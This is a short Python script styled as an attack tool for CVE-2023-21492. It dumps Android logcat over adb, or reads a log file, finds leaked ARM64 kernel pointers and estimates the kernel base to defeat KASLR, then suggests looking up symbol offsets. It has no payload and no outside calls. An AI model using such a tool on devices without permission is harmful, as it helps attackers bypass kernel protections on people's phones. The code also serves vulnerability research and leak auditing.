import re
import sys
import subprocess

# ARM64 Kernel addresses always start with 0xffff
# Samsung Exynos/Qualcomm kernel space: 0xffffffc000000000+
KERNEL_ADDR_PATTERN = re.compile(
    r'0x(ffff[0-9a-f]{12})',
    re.IGNORECASE
)

def banner():
    print("""
\033[91m
 ╔══════════════════════════════════════╗
 ║   KERNEL POINTER SCANNER  v1.0      ║
 ║   Technique: CVE-2023-21492         ║
 ║   Author   : V0ID                   ║
 ╚══════════════════════════════════════╝
\033[0m""")


def scan_file(filepath):
    ''' Scan a log file for leaked kernel addresses '''
    found = []

    try:
        with open(filepath, 'r', errors='replace') as f:
            for lineno, line in enumerate(f, 1):
                matches = KERNEL_ADDR_PATTERN.findall(line)
                for match in matches:
                    addr = int(match, 16)
                    found.append({
                        'line'      : lineno,
                        'address'   : addr,
                        'hex'       : f"0x{match}",
                        'context'   : line.strip()[:80]

                    })

    except FileNotFoundError:
        print(f"[-] File not found: {filepath}")
        sys.exit(1)


    return found


def analyze(found):
    """ Analyze leaked addresses to estimate kernel base """
    if not found:
        print("[-] No kernel addresses found")
        return
    addrs = [e['address'] for e in found]
    lowest = min(addrs)
    highest =max(addrs)


    print(f"[+] Total leaked addresses : {len(found)}")
    print(f"[+] Lowest address         : {hex(lowest)}")
    print(f"[+] Highest address        : {hex(highest)}")
    print(f"[+] Address range          : {hex(highest - lowest)}")
    print()


    # unique address only
    unique = list(set(addrs))
    unique.sort()


    print(f"[+] Unique addresses ({len(unique)}:")
    for addr in unique[:20]: # show 20 first
        print(f"    -> {hex(addr)}")

    print()
    print(f"\033[93m[*] Estimated kernel base  : {hex(lowest & ~0xFFFFF)}\033[0m")
    print(f"\033[93m[*] KASLR status           : POTENTIALLY DEFEATED\033[0m")
    print()
    print("[*] Next step: cross-reference with kernel symbol table")
    print("    Download Samsung kernel source → grep for symbol offsets")


def scan_logcat():
    """ Pull live Android logs via adb and scan them """
    print("[+] Pulling live logcar from connected device...")
    print("[+] Press CTRL+C to stop\n")


    try:
        # Run adb logcat and pipe output
        proc = subprocess.Popen(
            ['adb', 'logcat', '-d'], # -d = dump and exit
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, _ = proc.communicate()

        # Write to temp file and scan it
        tmpfile = '/tmp/logcat_dump.txt'
        with open(tmpfile, 'w') as f:
            f.write(stdout)

        print(f"[+] Captured {len(stdout.splitlines())} log lines")
        print(f"[+] Scanning for kernel pointers..\n")


        found = scan_file(tmpfile)
        analyze(found)


    except FileNotFoundError:
        print("[-] adb not found - scan file instead")
        print(f"    Usage: python3 {sys.argv[0]} <logfile>")



if __name__ == '__main__':
    banner()

    if len(sys.argv) < 2:
        # No file given - try live adb scan
        scan_logcat()

    else:
        # scan provided file
        print(f"[*] Scanning: {sys.argv[1]}\n")
        found = scan_file(sys.argv[1])


        print("[+] Matches found:")
        for entry in found[:20]:
            print(f"    Line {entry['line']:4d} | {entry['hex']} | {entry['context']}")

        print()

        analyze(found)
